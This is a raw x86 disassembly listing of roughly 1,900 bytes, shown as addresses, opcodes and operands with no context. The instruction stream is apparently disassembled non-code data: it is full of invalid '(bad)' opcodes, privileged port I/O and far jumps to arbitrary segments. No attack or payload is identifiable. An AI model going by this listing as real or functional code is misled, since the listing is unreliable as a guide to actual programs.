  433ec1:	pop    esp
  433ec2:	sbb    DWORD PTR [ecx],eax
  433ec4:	push   esp
  433ec5:	cwde   
  433ec6:	in     eax,0xe3
  433ec8:	into   
  433ec9:	mov    dh,0x3e
  433ecb:	jne    0x433e84
  433ecd:	jne    0x433ef8
  433ecf:	les    ebp,FWORD PTR [ecx*1-0x4d68a43c]
  433ed6:	jne    0x433ef4
  433ed8:	ins    DWORD PTR es:[edi],dx
  433ed9:	ficom  WORD PTR [eax+0x689ed713]
  433edf:	outs   dx,DWORD PTR ds:[esi]
  433ee0:	outs   dx,DWORD PTR ds:[esi]
  433ee1:	pusha  
  433ee2:	icebp  
  433ee3:	rcr    BYTE PTR [ecx-0x66],0x29
  433ee7:	pop    esi
  433ee8:	pop    ds
  433ee9:	das    
  433eea:	fwait
  433eeb:	or     bh,0x57
  433eee:	(bad)  
  433eef:	bound  edx,QWORD PTR ds:0xde8e19a7
  433ef5:	adc    eax,0x62ca638f
  433efa:	shr    DWORD PTR [ecx+0x33],cl
  433efd:	cmp    al,0xf4
  433eff:	stc    
  433f00:	push   0xffffffd5
  433f02:	xlat   BYTE PTR ds:[ebx]
  433f03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433f04:	jns    0x433f0b
  433f06:	dec    edx
  433f07:	jecxz  0x433f84
  433f09:	push   ebx
  433f0a:	stos   DWORD PTR es:[edi],eax
  433f0b:	jmp    0xd6e91723
  433f10:	clc    
  433f11:	out    dx,eax
  433f12:	std    
  433f13:	dec    ebx
  433f14:	stos   BYTE PTR es:[edi],al
  433f15:	idiv   DWORD PTR [ebx]
  433f17:	jecxz  0x433f64
  433f19:	sub    al,BYTE PTR [edx+0x12]
  433f1c:	daa    
  433f1d:	fistp  WORD PTR [esi+edx*2-0x71]
  433f21:	jno    0x433f39
  433f23:	jnp    0x433ea8
  433f25:	mov    esi,0xdeca5b42
  433f2a:	push   ebp
  433f2b:	dec    edi
  433f2c:	loope  0x433ed4
  433f2e:	adc    eax,0xa5960c33
  433f33:	xor    al,0xc5
  433f35:	mov    ds:0x7e6032cc,eax
  433f3a:	jl     0x433ec1
  433f3c:	outs   dx,DWORD PTR ds:[esi]
  433f3d:	and    BYTE PTR [ebx-0x12],0x8b
  433f41:	call   0x4e3e:0xf30e1f27
  433f48:	adc    bh,BYTE PTR ds:0xf4956097
  433f4e:	pop    eax
  433f4f:	adc    al,BYTE PTR [ecx-0x21]
  433f52:	dec    edx
  433f53:	stos   DWORD PTR es:[edi],eax
  433f54:	adc    eax,0x33a1fce4
  433f59:	sub    BYTE PTR [eax],0xa8
  433f5c:	and    BYTE PTR [eax],0xb8
  433f5f:	inc    edi
  433f60:	adc    ch,cl
  433f62:	fdivr  st,st(4)
  433f64:	mov    DWORD PTR [ebx-0x239996c5],esi
  433f6a:	and    ecx,DWORD PTR [ecx-0x5a74d339]
  433f70:	(bad)  
  433f71:	lods   al,BYTE PTR ds:[esi]
  433f72:	adc    al,0xbc
  433f74:	aam    0xc8
  433f76:	or     ebp,ecx
  433f78:	outs   dx,WORD PTR ds:[esi]
  433f7a:	sub    ebx,ecx
  433f7c:	sbb    BYTE PTR [ebx],0x70
  433f7f:	addr16 pop edx
  433f81:	retf   0x7c70
  433f84:	mov    esi,edi
  433f86:	stos   DWORD PTR es:[edi],eax
  433f87:	(bad)  
  433f88:	in     al,0x7e
  433f8a:	and    al,BYTE PTR [ebx-0x18735e52]
  433f90:	das    
  433f91:	pop    edi
  433f92:	test   BYTE PTR [edi],0x6d
  433f95:	dec    esp
  433f96:	and    DWORD PTR [ecx+0x84a3cc8],eax
  433f9c:	(bad)  
  433f9d:	int3   
  433f9e:	push   esp
  433f9f:	pusha  
  433fa0:	pushf  
  433fa1:	sbb    eax,0x1fc01e68
  433fa6:	ins    BYTE PTR es:[edi],dx
  433fa7:	and    al,0xe6
  433fa9:	test   dl,dh
  433fab:	or     DWORD PTR [edx+0x53],0x23a4781d
  433fb2:	inc    ecx
  433fb3:	clc    
  433fb4:	aas    
  433fb5:	xor    ah,dh
  433fb7:	hlt    
  433fb8:	dec    ebx
  433fb9:	inc    ebx
  433fba:	and    BYTE PTR [edi+0x41],0xb4
  433fbe:	xlat   BYTE PTR ds:[ebx]
  433fbf:	cs add eax,0x375d4c0c
  433fc5:	sbb    eax,0x4fb87f41
  433fca:	lahf   
  433fcb:	fisttp WORD PTR ds:0xe818a6af
  433fd1:	and    al,0x89
  433fd3:	mov    dh,0xdd
  433fd5:	dec    edi
  433fd6:	dec    edx
  433fd7:	cmova  edi,DWORD PTR [edx+0x68]
  433fdb:	pop    edi
  433fdc:	pop    ss
  433fdd:	mov    al,ds:0xc2464615
  433fe2:	xchg   esi,eax
  433fe3:	(bad)  
  433fe5:	leave  
  433fe6:	push   esp
  433fe7:	outs   dx,BYTE PTR ds:[esi]
  433fe8:	jae    0x434006
  433fea:	sbb    eax,0x61652608
  433fef:	dec    ebx
  433ff0:	pop    ebp
  433ff1:	imul   esi,DWORD PTR [ebx],0xfa8c6187
  433ff7:	dec    ecx
  433ff8:	xchg   esi,eax
  433ff9:	imul   BYTE PTR [esi]
  433ffb:	aas    
  433ffc:	in     al,0xc2
  433ffe:	pop    ss
  433fff:	push   ebx
  434000:	mov    al,ds:0x74e0d496
  434005:	(bad)  
  434006:	pop    ebp
  434007:	stos   DWORD PTR es:[edi],eax
  434008:	pop    ss
  434009:	jp     0x433f92
  43400b:	jb     0x433fe9
  43400d:	ret    0xbb07
  434010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434011:	loopne 0x433fed
  434013:	ds xchg ebp,eax
  434015:	mov    ah,0xfd
  434017:	retf   0xa028
  43401a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43401b:	(bad)  
  43401c:	or     edx,esi
  43401e:	scas   eax,DWORD PTR es:[edi]
  43401f:	call   esp
  434021:	stc    
  434022:	mov    ebp,0xcbe02e52
  434027:	test   BYTE PTR [edi],ah
  434029:	pop    esi
  43402a:	call   0x8bf723c6
  43402f:	dec    ebx
  434030:	(bad)  
  434031:	loope  0x434080
  434033:	inc    ebx
  434034:	aam    0xbb
  434036:	jno    0x433ffb
  434038:	cwde   
  434039:	mov    es,esi
  43403b:	mov    ?,ebp
  43403d:	add    eax,0x52e6f973
  434042:	aam    0x50
  434044:	lahf   
  434045:	cmp    al,0xf1
  434047:	sar    DWORD PTR [ecx+esi*8],cl
  43404a:	or     BYTE PTR [ebx+ebx*1],bl
  43404d:	imul   esp,DWORD PTR [edi],0x1e361680
  434053:	dec    ecx
  434054:	test   BYTE PTR [ebp-0x4483a833],bl
  43405a:	inc    eax
  43405b:	lods   eax,DWORD PTR ds:[esi]
  43405c:	(bad)  
  43405d:	push   es
  43405e:	inc    esp
  43405f:	scas   al,BYTE PTR es:[edi]
  434060:	mov    ch,0x51
  434062:	xchg   ebp,eax
  434063:	and    al,0x78
  434065:	dec    ebx
  434066:	call   0x4c8c:0xdeb9c6a4
  43406d:	jo     0x43408e
  43406f:	pop    eax
  434070:	inc    ecx
  434071:	into   
  434072:	ret    
  434073:	mov    ecx,0x1a2c11e7
  434078:	dec    eax
  434079:	push   ss
  43407a:	or     cl,BYTE PTR [eax+0x65]
  43407d:	pop    eax
  43407e:	and    eax,0x17d23275
  434083:	mov    esp,0x508cdb84
  434088:	clc    
  434089:	mov    esi,0xc3eb31b6
  43408e:	sahf   
  43408f:	jns    0x43401f
  434091:	xchg   edx,eax
  434092:	(bad)  
  434093:	and    al,0x2b
  434095:	loopne 0x434048
  434097:	ins    BYTE PTR es:[edi],dx
  434098:	test   al,0x1
  43409a:	(bad)  
  43409b:	pop    ebx
  43409c:	sub    bl,dh
  43409e:	(bad)  [esi-0x1318962a]
  4340a4:	xor    BYTE PTR [edi],ch
  4340a6:	add    esp,DWORD PTR [edi+0x7fd38afc]
  4340ac:	inc    esp
  4340ad:	sbb    ebp,DWORD PTR [edi+0x44]
  4340b0:	jmp    eax
  4340b2:	cmp    eax,0x3b031328
  4340b7:	in     eax,dx
  4340b8:	cmp    eax,0xf06af2d
  4340bd:	mov    bh,0x2d
  4340bf:	cld    
  4340c0:	add    al,0xf5
  4340c2:	xor    eax,0xe3fb835d
  4340c7:	pop    edi
  4340c8:	das    
  4340c9:	jbe    0x4340a7
  4340cb:	or     bh,BYTE PTR cs:[edi]
  4340ce:	push   eax
  4340cf:	dec    ebp
  4340d0:	lods   eax,DWORD PTR ds:[esi]
  4340d1:	(bad)  
  4340d2:	sbb    eax,0xd497878
  4340d7:	mov    bl,0xdd
  4340d9:	xor    eax,0x6341c583
  4340de:	test   DWORD PTR ds:0x7f4a03c7,edx
  4340e4:	in     eax,0x23
  4340e6:	xchg   BYTE PTR [edi+0xb],bl
  4340e9:	loop   0x434078
  4340eb:	add    DWORD PTR [edx-0x4e],ebx
  4340ee:	and    BYTE PTR [edi-0x45],0xd8
  4340f2:	xor    eax,0xbd770ee2
  4340f7:	ror    BYTE PTR [edi],0xa6
  4340fa:	push   0x51
  4340fc:	add    ebp,DWORD PTR [eax]
  4340fe:	inc    ebx
  4340ff:	sbb    eax,0xd50dd778
  434104:	inc    edi
  434105:	pop    edx
  434106:	adc    edx,DWORD PTR ds:0x19dd5e57
  43410c:	call   0xfa72:0xe1a4a26a
  434113:	or     ebx,DWORD PTR [esi-0x35]
  434116:	sbb    ecx,esp
  434118:	test   eax,0x33bf0463
  43411d:	or     eax,0xdff1634a
  434122:	pop    ebp
  434123:	push   edi
  434124:	mov    esp,0x848212fe
  434129:	(bad)  
  43412a:	addr16 je 0x43419b
  43412d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43412e:	sub    ecx,ebx
  434130:	into   
  434131:	imul   ebx,DWORD PTR [ebx],0xffffffa4
  434134:	push   es
  434135:	pop    edi
  434136:	push   eax
  434137:	ficomp WORD PTR [ebx+edi*8+0x47]
  43413b:	adc    dl,al
  43413d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43413e:	ficomp WORD PTR [ebx]
  434140:	test   dl,dh
  434142:	int    0x15
  434144:	jp     0x434189
  434146:	or     esp,ebx
  434148:	pop    edi
  434149:	pop    edi
  43414a:	xchg   ebx,eax
  43414b:	hlt    
  43414c:	lds    ebx,FWORD PTR [ecx+0x16]
  43414f:	jle    0x434185
  434151:	stc    
  434152:	jns    0x434122
  434154:	jae    0x43411f
  434156:	ficomp WORD PTR [edi-0x7c]
  434159:	push   edx
  43415a:	sub    al,0xe5
  43415d:	cli    
  43415e:	cmp    al,BYTE PTR [ebx-0x39]
  434161:	xor    BYTE PTR [eax],cl
  434163:	dec    esp
  434164:	or     al,0x57
  434166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434167:	loop   0x43412f
  434169:	pusha  
  43416a:	mov    ecx,0x8c91942d
  43416f:	xor    eax,esp
  434171:	aad    0x7b
  434173:	(bad)  
  434174:	addr16 mov ds:0xd972,al
  434178:	cdq    
  434179:	test   BYTE PTR fs:0x589d6afb,0xa3
  434181:	ficom  DWORD PTR [eax+eiz*4+0x4ec45642]
  434188:	or     ah,BYTE PTR [edx]
  43418a:	fbld   TBYTE PTR ss:[esi]
  43418d:	and    dh,BYTE PTR [edi]
  43418f:	xchg   esi,eax
  434190:	cmp    eax,0xcd43204
  434195:	mov    cl,0xc1
  434197:	add    dl,BYTE PTR [ecx]
  434199:	cmp    eax,0xa49faa14
  43419e:	push   edi
  43419f:	fsub   DWORD PTR [eax]
  4341a1:	jecxz  0x43415c
  4341a3:	pop    ds
  4341a4:	sbb    dl,BYTE PTR [ebp-0x7c]
  4341a7:	ss jmp 0x7967:0x4271e954
  4341af:	add    BYTE PTR [edx-0x4ac5ca1c],ah
  4341b5:	lods   al,BYTE PTR ds:[esi]
  4341b6:	jp     0x43414c
  4341b8:	mov    ds:0xcf63beeb,eax
  4341bd:	push   0xffffffc0
  4341bf:	into   
  4341c0:	rcl    BYTE PTR [edi],cl
  4341c2:	dec    eax
  4341c3:	sub    esp,DWORD PTR [bx+si+0x446e]
  4341c8:	xor    DWORD PTR [ecx+0x2ecc71df],0x220611cb
  4341d2:	sub    edx,ebp
  4341d4:	mov    ds:0xec3a6e5d,eax
  4341d9:	xlat   BYTE PTR ds:[ebx]
  4341da:	inc    esi
  4341db:	test   ecx,edx
  4341dd:	pop    esi
  4341de:	loop   0x43419b
  4341e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341e1:	sbb    BYTE PTR [esi],cl
  4341e3:	arpl   WORD PTR [esi],dx
  4341e5:	mov    ch,0xe5
  4341e7:	xor    eax,0xa6b40a5b
  4341ec:	add    BYTE PTR [edx-0x19b812b9],cl
  4341f2:	test   BYTE PTR [ebx+ebp*4-0x7e],dl
  4341f6:	adc    eax,0xe13d9fac
  4341fb:	sbb    DWORD PTR [ecx+0x18],ebx
  4341fe:	sub    ebx,ecx
  434200:	iret   
  434201:	mov    BYTE PTR [eax],ah
  434203:	cmp    eax,0xf81dbe7
  434208:	mov    BYTE PTR [ebp-0x64],ch
  43420b:	ret    0xf10a
  43420e:	adc    eax,0x58173a0c
  434213:	aad    0x2d
  434215:	lods   eax,DWORD PTR ds:[esi]
  434216:	adc    DWORD PTR [edx-0x4b195770],edi
  43421c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43421d:	mov    edi,0x91831cc2
  434222:	or     eax,0x92f4d832
  434227:	add    bh,BYTE PTR [edi-0x1607bd54]
  43422d:	inc    eax
  43422e:	fucomp st(7)
  434230:	lods   al,BYTE PTR ds:[esi]
  434231:	add    ch,BYTE PTR [ecx+0x3c]
  434234:	pop    eax
  434235:	dec    ebx
  434236:	popf   
  434237:	and    edx,esp
  434239:	gs sti 
  43423b:	test   DWORD PTR [esi],edx
  43423d:	pop    ebp
  43423e:	add    esi,DWORD PTR [esi-0x6ec76683]
  434244:	(bad)  
  434245:	mov    dh,0xa6
  434247:	cmp    esi,DWORD PTR [ecx+0x4f]
  43424a:	or     al,0xd3
  43424c:	sbb    ecx,DWORD PTR [ebp-0x73]
  43424f:	mov    ch,0x95
  434251:	xchg   ebx,eax
  434252:	shr    BYTE PTR [edx+0x7d21abbe],0x52
  434259:	sbb    al,0xb9
  43425b:	push   ss
  43425c:	in     eax,0xc9
  43425e:	call   0x63ec6a10
  434263:	jmp    0x4341f4
  434265:	push   edi
  434266:	jge    0x434234
  434268:	fbstp  TBYTE PTR [esi-0x20fb40a0]
  43426e:	dec    eax
  43426f:	inc    esp
  434270:	loopne 0x43420d
  434272:	in     eax,0xc1
  434274:	fmul   QWORD PTR [ebp+0x3d]
  434277:	push   esp
  434278:	punpcklwd mm1,DWORD PTR [ecx-0x312ba2fb]
  43427f:	jp     0x434248
  434281:	gs sbb al,0xcf
  434284:	dec    ebx
  434285:	mov    BYTE PTR [ebx-0x398e1cac],ch
  43428b:	jmp    0x4342cd
  43428d:	out    dx,al
  43428e:	js     0x4342a9
  434290:	lock jne 0x434268
  434293:	push   ecx
  434294:	in     al,dx
  434295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434296:	ficomp WORD PTR ss:0x25ad2699
  43429d:	inc    edi
  43429e:	loop   0x434225
  4342a0:	loopne 0x434275
  4342a2:	push   0x2296bebf
  4342a7:	test   al,0xa5
  4342a9:	pop    esp
  4342aa:	mov    edx,0xa499b124
  4342af:	repz imul edx,DWORD PTR [eax+0x1a49681a],0x21
  4342b7:	mov    ah,0x5e
  4342b9:	pop    ecx
  4342ba:	lods   al,BYTE PTR ds:[esi]
  4342bb:	leave  
  4342bc:	sahf   
  4342bd:	mov    al,0xf3
  4342bf:	dec    eax
  4342c0:	into   
  4342c1:	sahf   
  4342c2:	jno    0x434336
  4342c4:	lea    edx,[ecx]
  4342c6:	mov    al,BYTE PTR [edx+eax*1]
  4342c9:	popa   
  4342ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4342cb:	js     0x4342e3
  4342cd:	lods   eax,DWORD PTR ds:[esi]
  4342ce:	jb     0x4342c9
  4342d0:	and    DWORD PTR [ecx-0x62],0x5c
  4342d4:	out    0xe7,eax
  4342d6:	sub    al,0xe6
  4342d8:	div    BYTE PTR [esi+0x7d]
  4342db:	or     BYTE PTR [esi-0x11],0x76
  4342df:	adc    al,0x6f
  4342e1:	and    edi,ebx
  4342e3:	inc    ebx
  4342e4:	(bad)  
  4342e5:	sti    
  4342e6:	scas   eax,DWORD PTR es:[edi]
  4342e7:	pop    ds
  4342e8:	inc    ecx
  4342e9:	sbb    cl,BYTE PTR [ecx]
  4342eb:	ffreep st(3)
  4342ed:	add    BYTE PTR [ebp+0x72],0xdb
  4342f1:	dec    edx
  4342f2:	jbe    0x434324
  4342f4:	shr    DWORD PTR fs:0xee82a68c,cl
  4342fb:	mov    DWORD PTR [esi+0x3ae54c1d],edi
  434301:	(bad)  
  434302:	xchg   ebx,eax
  434303:	or     eax,0x34594822
  434308:	scas   eax,DWORD PTR es:[edi]
  434309:	daa    
  43430a:	mov    cl,0xf5
  43430c:	push   esp
  43430e:	cmp    BYTE PTR [eax],ah
  434310:	test   BYTE PTR [edi],0xa8
  434313:	lahf   
  434314:	pop    ecx
  434315:	dec    esi
  434316:	pop    ss
  434317:	add    al,0xf9
  434319:	imul   DWORD PTR [esi-0x18a06ffa]
  43431f:	ins    DWORD PTR es:[edi],dx
  434320:	inc    esp
  434321:	call   ebx
  434323:	xchg   edi,eax
  434324:	pushf  
  434325:	xor    eax,0x5c6c36c2
  43432a:	out    0x7a,eax
  43432c:	les    edi,FWORD PTR [ecx+0x60473dc9]
  434332:	dec    ecx
  434333:	outs   dx,DWORD PTR ds:[esi]
  434334:	adc    esp,DWORD PTR [edi]
  434336:	test   al,0xe6
  434338:	inc    si
  43433a:	xchg   DWORD PTR [ebx-0x4a],esi
  43433d:	fisub  DWORD PTR [edx]
  43433f:	pop    esi
  434340:	adc    bl,BYTE PTR [eax+0x14bc4348]
  434346:	sub    cl,dh
  434348:	mov    ds:0x84e88f68,al
  43434d:	and    BYTE PTR [eax-0x7d],ch
  434350:	dec    ecx
  434351:	ret    0x6ca7
  434354:	and    eax,0x81f440ea
  434359:	xor    al,0xa6
  43435b:	dec    esi
  43435c:	sub    eax,0x979e6334
  434361:	mov    ah,0xd7
  434363:	retf   0x5d47
  434366:	mov    ebx,0x2d5be732
  43436b:	xchg   bl,ch
  43436d:	adc    eax,0xd61a2935
  434372:	mov    bl,0xdb
  434374:	repnz lds ebx,FWORD PTR [eax+0x1ad5b7a7]
  43437b:	xchg   ebp,eax
  43437c:	mov    WORD PTR [edx+0x3a],?
  43437f:	jne    0x43438c
  434381:	xchg   ecx,eax
  434382:	and    eax,0x8057b73f
  434387:	pop    ecx
  434388:	xor    DWORD PTR [ebx+0x47],0xd0055035
  43438f:	(bad)  
  434390:	and    BYTE PTR [esp+ebx*1+0x4e83c63e],ah
  434397:	cmc    
  434398:	cmp    eax,0xedd741a4
  43439d:	in     eax,0xe6
  43439f:	out    dx,eax
  4343a0:	push   ecx
  4343a1:	inc    esi
  4343a2:	ds xor ebp,ebp
  4343a5:	adc    al,0x5a
  4343a7:	mov    edi,0xbad976e2
  4343ac:	xchg   cx,ax
  4343ae:	jae    0x434395
  4343b0:	dec    ebx
  4343b1:	inc    edi
  4343b2:	inc    ecx
  4343b3:	out    0xfb,al
  4343b5:	pusha  
  4343b6:	daa    
  4343b7:	out    0xdc,eax
  4343b9:	stos   DWORD PTR es:[edi],eax
  4343ba:	xor    ah,bh
  4343bc:	push   ebx
  4343bd:	cwde   
  4343be:	lock push ebx
  4343c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4343c1:	daa    
  4343c2:	sbb    al,0xe2
  4343c4:	mov    cl,0xe3
  4343c6:	and    ah,BYTE PTR [ecx+0x3b055aac]
  4343cc:	inc    eax
  4343cd:	push   ss
  4343ce:	in     al,dx
  4343cf:	inc    eax
  4343d0:	xchg   esi,eax
  4343d1:	sub    eax,0x29888a98
  4343d6:	(bad)  
  4343d7:	jmp    0x4343cb
  4343d9:	xlat   BYTE PTR ds:[ebx]
  4343da:	ror    ebx,1
  4343dc:	or     ebp,DWORD PTR [edi]
  4343de:	retf   0x5b6
  4343e1:	mov    ah,0x31
  4343e3:	jmp    0x99f7:0x384a34d2
  4343ea:	sbb    eax,DWORD PTR [ebp-0x66]
  4343ed:	inc    ecx
  4343ee:	mov    ds:0x37f371a2,eax
  4343f3:	jecxz  0x4343f3
  4343f5:	(bad)  
  4343f6:	fwait
  4343f7:	xor    bl,BYTE PTR [edx+ecx*8-0x395df597]
  4343fe:	pop    edx
  4343ff:	jg     0x4343f6
  434401:	push   ss
  434402:	ins    DWORD PTR es:[edi],dx
  434403:	aad    0x11
  434405:	test   al,0x9d
  434407:	cmp    BYTE PTR [eax-0x5be39b36],0x55
  43440e:	xchg   DWORD PTR [ebx+0x104aef48],ebx
  434414:	test   al,0x5a
  434416:	ret    0xa76e
  434419:	xchg   edi,eax
  43441a:	in     eax,0x4e
  43441c:	lahf   
  43441d:	cli    
  43441e:	sub    DWORD PTR fs:[esi],edx
  434421:	mov    bl,dh
  434423:	ret    0x58fd
  434426:	in     eax,0xab
  434428:	dec    ecx
  434429:	sub    al,0xd6
  43442b:	adc    dl,BYTE PTR [edx]
  43442d:	cmp    eax,0xc377f356
  434432:	stos   DWORD PTR es:[edi],eax
  434433:	lea    esi,[ecx-0x73a4c15]
  434439:	call   0x8d45:0xfb04a845
  434440:	test   DWORD PTR [ecx+0x1f24d219],ebp
  434446:	lahf   
  434447:	push   ebp
  434448:	lock lods al,BYTE PTR ds:[esi]
  43444a:	adc    al,0xbd
  43444c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43444d:	or     edi,eax
  43444f:	mov    ah,0x3c
  434451:	outs   dx,DWORD PTR ds:[esi]
  434452:	push   cs
  434453:	dec    ebp
  434454:	and    eax,0xbcc42038
  434459:	pop    eax
  43445a:	xchg   esi,eax
  43445b:	arpl   bx,bp
  43445d:	in     eax,dx
  43445e:	fcom   QWORD PTR [ebp+0x65f944cc]
  434464:	test   BYTE PTR [eax+0x5af45241],bl
  43446a:	inc    esp
  43446b:	jne    0x434402
  43446d:	data16 (bad) 
  43446f:	xchg   edx,eax
  434470:	pop    ecx
  434471:	lock or DWORD PTR [edx],0xfffffffa
  434475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434476:	stos   DWORD PTR es:[edi],eax
  434477:	arpl   WORD PTR [eax+0x7defffaa],bx
  43447d:	popf   
  43447e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43447f:	jo     0x434486
  434481:	pop    edi
  434482:	jl     0x434488
  434484:	or     BYTE PTR [ebx],ch
  434486:	(bad)  
  434487:	mov    ebx,0xc57a9eda
  43448c:	mov    BYTE PTR [edi+ecx*2-0x74d46316],0x20
  434494:	xchg   edx,eax
  434495:	jbe    0x434505
  434497:	bswap  ebx
  434499:	div    BYTE PTR [esp+eiz*8]
  43449c:	(bad)  
  43449d:	cmc    
  43449e:	stos   BYTE PTR es:[edi],al
  43449f:	mov    DWORD PTR [edx],edi
  4344a1:	scas   eax,DWORD PTR es:[edi]
  4344a2:	mov    esi,DWORD PTR [eax]
  4344a4:	(bad)  
  4344a5:	retf   0xe930
  4344a8:	dec    edi
  4344a9:	std    
  4344aa:	sub    ebx,DWORD PTR [ecx-0x3c]
  4344ad:	ds inc esi
  4344af:	xor    dh,BYTE PTR [esi+ebp*2+0x70]
  4344b3:	inc    esp
  4344b4:	loopne 0x434446
  4344b6:	sbb    dh,BYTE PTR [esi]
  4344b8:	xchg   edi,eax
  4344b9:	sbb    al,BYTE PTR [ecx-0x30]
  4344bc:	(bad)  
  4344bd:	call   DWORD PTR [eax]
  4344bf:	imul   edx,DWORD PTR [esp+eax*4-0x63],0x56
  4344c4:	mov    edx,0x69b49344
  4344c9:	mov    bh,0x77
  4344cb:	sub    BYTE PTR [edx],dl
  4344cd:	and    dh,BYTE PTR [eax]
  4344cf:	scas   eax,DWORD PTR es:[edi]
  4344d0:	jmp    0x5ea4:0xf579d6da
  4344d7:	fs or  eax,0xd1d0425d
  4344dd:	out    dx,al
  4344de:	pop    es
  4344df:	out    0x6c,al
  4344e1:	cmp    bl,BYTE PTR [ebx]
  4344e3:	ja     0x4344c1
  4344e5:	cmp    DWORD PTR [ecx+0x354a8402],edi
  4344eb:	retf   
  4344ec:	(bad)  
  4344ed:	(bad)  
  4344ee:	jmp    0x4344ca
  4344f0:	mov    ebp,0x9959617e
  4344f5:	je     0x4344cc
  4344f7:	push   es
  4344f8:	out    dx,al
  4344f9:	gs mov ch,0x2c
  4344fc:	ss push 0xe39c7fe8
  434502:	dec    esi
  434503:	sub    eax,edx
  434505:	mov    bh,0xb4
  434507:	mov    esp,0x5d333775
  43450c:	add    ch,dl
  43450e:	(bad)  
  43450f:	std    
  434510:	iret   
  434511:	dec    eax
  434512:	loope  0x434505
  434514:	lods   al,BYTE PTR ds:[esi]
  434515:	cwde   
  434516:	sbb    ch,BYTE PTR [esi-0x63c67ccd]
  43451c:	mov    ebx,0xa314c155
  434521:	ret    
  434522:	lods   al,BYTE PTR ds:[esi]
  434523:	cmp    edx,DWORD PTR [eax+0x6e]
  434526:	enter  0x733,0x58
  43452a:	stos   BYTE PTR es:[edi],al
  43452b:	xor    BYTE PTR [edi-0x63f6d987],dh
  434531:	sub    edi,eax
  434533:	push   0x3508f3e6
  434538:	idiv   DWORD PTR cs:[esi-0xe]
  43453c:	ret    0xc2eb
  43453f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434540:	or     esp,ecx
  434542:	repz jne 0x434573
  434545:	fbld   TBYTE PTR [ebx+esi*2]
  434548:	lahf   
  434549:	mov    cl,0x4f
  43454b:	jmp    0x43455d
  43454d:	loope  0x4345ad
  43454f:	rol    edi,1
  434551:	fisubr WORD PTR [ecx+0x1]
  434554:	jnp    0x4345aa
  434556:	dec    esp
  434557:	or     bh,BYTE PTR [esi+0x7c]
  43455a:	sbb    dh,BYTE PTR [edx+edi*8+0x715c6b5e]
  434561:	iret   
  434562:	aad    0xf6
  434564:	loope  0x4345ca
  434566:	adc    al,0x8e
  434568:	jmp    0x43457d
  43456a:	dec    ecx
  43456b:	dec    ebp
  43456c:	xor    eax,0x2950f706
  434571:	mov    ds:0x9f36923e,eax
  434576:	arpl   cx,cx
  434578:	jno    0x43457f
  43457a:	mov    ds:0x10434e2,eax
  43457f:	fisub  DWORD PTR ds:0xad58afb4
  434585:	sbb    al,0x97
  434587:	iret   
  434588:	and    DWORD PTR [ecx+0x7ee0696a],esp
  43458e:	jns    0x434544
  434590:	inc    eax
  434591:	add    dl,0x2e
  434594:	cmp    DWORD PTR [ebx],ecx
  434596:	jl     0x434601
  434598:	sub    eax,DWORD PTR [esi-0x6a]
  43459b:	mov    DWORD PTR [ebx+0x6fa54168],edx
  4345a1:	jns    0x434553
  4345a3:	out    0xad,eax
  4345a5:	jp     0x434593
  4345a7:	fcomi  st,st(6)
  4345a9:	jbe    0x4345bb
  4345ab:	or     al,0xf9
  4345ad:	call   0x7cd6:0xdd8cfbac
  4345b4:	ds leave 
  4345b6:	pop    edi
  4345b7:	inc    ecx
  4345b8:	xor    ebx,DWORD PTR [edi+eax*2-0x3740fa35]
  4345bf:	mov    ch,0xfe
  4345c1:	mov    DWORD PTR [eax-0x37],esi
  4345c4:	or     ebx,DWORD PTR [eax+0x4a]
  4345c7:	sbb    al,0xd8
  4345c9:	dec    esi
  4345ca:	or     ecx,ecx
  4345cc:	pop    ebx
  4345cd:	cmp    DWORD PTR [eax-0x2089b859],edi
  4345d3:	sbb    esi,DWORD PTR [edi-0x56]
  4345d6:	mov    dl,0x97
  4345d8:	pop    es
  4345d9:	inc    ebp
  4345da:	mov    esi,0x5bba3cf0
  4345df:	jmp    0x2d61:0xf358776
  4345e6:	inc    esi
  4345e7:	add    esp,esi
  4345e9:	into   
  4345ea:	ins    DWORD PTR es:[edi],dx
  4345eb:	push   eax
  4345ec:	das    
  4345ed:	inc    ebp
  4345ee:	cs push ebx
  4345f0:	div    BYTE PTR [eax]
  4345f2:	and    BYTE PTR [esi-0x48],ah
  4345f5:	pop    edi
  4345f6:	(bad)  
  4345f7:	arpl   WORD PTR [ecx+0x3219ae55],si
  4345fd:	cli    
  4345fe:	dec    esi
  4345ff:	aad    0x21
  434601:	lds    edi,FWORD PTR [esi]
  434603:	xor    esi,0xf0b7eceb
  434609:	in     al,dx
  43460a:	pop    ebx
  43460b:	xchg   ebp,eax
  43460c:	mov    cl,0x57
  43460e:	popf   
  43460f:	pop    esp
  434610:	aaa    
  434611:	fcom   QWORD PTR [eax-0x4ec8219e]
  434617:	cmp    BYTE PTR ds:0x2f2cd2b9,bl
  43461d:	sbb    ecx,DWORD PTR [eax-0x15]
  434620:	aam    0x2b
  434622:	mov    ds:0x80e854f,eax
  434627:	(bad)  
  434628:	or     eax,0xe35865b1
  43462d:	(bad)
  434630:	in     al,0x72
  434632:	pop    ebp
  434633:	lds    edi,FWORD PTR ss:[ebp+eiz*1-0x2cd7381a]
  43463b:	(bad)  
  43463c:	(bad)
  43463f:	pusha  
  434640:	sbb    BYTE PTR [ebx+ecx*2+0x1786c8ca],bh
  434647:	int    0x5a
  434649:	pop    edi
  43464a:	add    eax,DWORD PTR [edx-0x17]
  43464d:	inc    ebx
  43464e:	add    DWORD PTR [ebx],0xe75a0e0a
  434654:	addr16 push ecx
  434656:	add    eax,0x6b58cece
  43465b:	fdiv   QWORD PTR [edx-0x74d40e7d]
  434661:	push   eax
  434662:	or     eax,DWORD PTR [edi+0x41]
